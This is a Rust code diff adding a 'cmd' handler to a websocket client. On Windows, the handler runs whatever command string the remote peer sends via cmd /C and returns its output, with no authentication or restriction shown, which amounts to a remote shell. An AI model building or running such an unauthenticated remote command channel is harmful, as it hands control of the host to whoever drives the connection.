@@ -101,9 +101,35 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         OwnedMessage::Text(string) => {
           let command: Command = serde_json::from_str(&string).expect("Could not parse command.");
 
-          let out: &str = match command.name {
-            _ => "Unknown command.",
-          };
+          let out: String = (|| -> String {
+            match &*command.name {
+                "cmd" => {
+                  let input = match serde_json::to_string(&command.data["input"]) {
+                    Ok(v) => v,
+                    Err(_) => "echo Hello, World!".to_string()
+                  };
+
+                  if env::consts::OS != "windows" {
+                    return "Unsupported OS.".to_string();
+                  }
+
+                  let output = match std::process::Command::new("cmd").args(&["/C", &input]).output() {
+                    Ok(v) => v,
+                    Err(_) => {
+                      return "Error while running command.".to_string();
+                    }
+                  };
+                  let stdout = match String::from_utf8(output.stdout) {
+                    Ok(v) => v,
+                    Err(_) => "Could not parse command.".to_string()
+                  };
+                  return stdout
+                },
+                _ => {
+                  return "Unknown command.".to_string()
+                },
+            };
+          })();
 
           let output = json!({
             "name": command.name,
